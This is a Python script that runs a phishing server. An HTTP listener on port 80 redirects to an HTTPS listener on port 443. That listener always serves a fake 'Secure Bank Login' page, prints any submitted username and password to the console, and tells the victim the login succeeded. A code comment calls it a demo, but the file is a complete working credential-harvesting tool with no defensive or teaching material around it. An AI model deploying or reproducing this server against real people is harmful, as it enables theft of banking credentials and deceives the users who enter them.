from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
import threading

# HTTP handler that pushes everything to HTTPS
class HTTPRedirectHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Same host, same path, just https
        target_url = f"https://{self.headers['Host']}{self.path}"
        
        self.send_response(301)
        self.send_header('Location', target_url)
        self.end_headers()
        print(f"[HTTP] Redirecting client to {target_url}")

    def do_POST(self):
        # Redirect POSTs too (clients may change it to a GET)
        self.send_response(301)
        self.send_header('Location', f"https://{self.headers['Host']}{self.path}")
        self.end_headers()

# HTTPS handler that serves the login page
class SecureHandler(SimpleHTTPRequestHandler):
    
    # Small HTML template for the demo
    LOGIN_PAGE = b"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Secure Bank Login</title>
        <style>
            body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #f0f2f5; }
            .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
            h2 { text-align: center; color: #1a73e8; }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
            button:hover { background-color: #1557b0; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Secure Login</h2>
            <p style="text-align:center; color:gray; font-size: 0.9em;">Please enter your credentials</p>
            <form method="POST" action="/login">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign In</button>
            </form>
        </div>
    </body>
    </html>
    """

    def do_GET(self):
        # Always serve the login page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(self.LOGIN_PAGE)
        print(f"[HTTPS] Served login page to {self.client_address[0]}")

    def do_POST(self):
        # Capture submitted credentials
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        print(f"\n[!] [HTTPS] CREDENTIALS RECEIVED from {self.client_address[0]}:")
        print(f"    Data: {post_data.decode('utf-8')}\n")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>Login Successful</h1><p>We have received your secure credentials.</p>")

def run_http_server():
    server_address = ('', 80)
    httpd = HTTPServer(server_address, HTTPRedirectHandler)
    print("[*] HTTP Server running on port 80 (Redirecting to HTTPS)")
    httpd.serve_forever()

def run_https_server():
    server_address = ('', 443)
    httpd = HTTPServer(server_address, SecureHandler)
    
    # Expects cert.pem and key.pem in the current working directory
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        print("[*] HTTPS Server running on port 443")
        httpd.serve_forever()
    except FileNotFoundError:
        print("[!] Error: 'cert.pem' or 'key.pem' not found. Please run the generation script first.")
    except Exception as e:
        print(f"[!] HTTPS Server Error: {e}")

if __name__ == '__main__':
    # Run both servers in parallel
    t1 = threading.Thread(target=run_http_server)
    t2 = threading.Thread(target=run_https_server)
    
    t1.daemon = True
    t2.daemon = True
    
    t1.start()
    t2.start()
    
    # Run until Ctrl+C
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[*] Stopping servers...")
